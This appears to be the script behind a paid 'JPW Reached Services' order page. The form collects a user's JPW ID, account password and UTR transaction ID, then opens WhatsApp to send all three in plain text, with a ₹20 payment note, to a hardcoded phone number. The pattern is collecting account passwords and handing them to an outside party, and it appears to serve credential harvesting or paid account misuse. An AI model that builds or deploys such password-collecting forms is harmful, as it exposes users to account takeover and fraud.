/*========================================
JPW REACHED SERVICES BOT v4
script.js (Manual UTR Verification)
========================================*/

const submitBtn = document.getElementById("submitBtn");
const jpwid = document.getElementById("jpwid");
const password = document.getElementById("password");
const utrid = document.getElementById("utrid");

/*========================================
SUBMIT TO WHATSAPP
========================================*/

submitBtn.addEventListener("click", submitForm);

function submitForm() {

  const idVal = jpwid.value.trim();
  const passVal = password.value.trim();
  const utrVal = utrid.value.trim();

  // Basic Validation
  if (idVal === "") {
    alert("Please enter JPW ID");
    jpwid.focus();
    return;
  }

  if (passVal === "") {
    alert("Please enter Password");
    password.focus();
    return;
  }

  if (utrVal === "") {
    alert("Please enter UTR / Transaction ID");
    utrid.focus();
    return;
  }

  // Format WhatsApp Message
  const msg = 
`*JPW REACHED SERVICES BOT*
---------------------------
*JPW ID:* ${idVal}
*Password:* ${passVal}
*UTR / Txn ID:* ${utrVal}
*Amount Paid:* ₹20
---------------------------
Please verify my payment and process the order.`;

  // Redirect to WhatsApp
  window.open(
    "https://wa.me/918167443801?text=" + encodeURIComponent(msg),
    "_blank"
  );
}

/*========================================
NETWORK MONITOR
========================================*/

window.addEventListener("offline", () => {
  alert("No Internet Connection");
});

window.addEventListener("online", () => {
  console.log("Internet Connected");
});
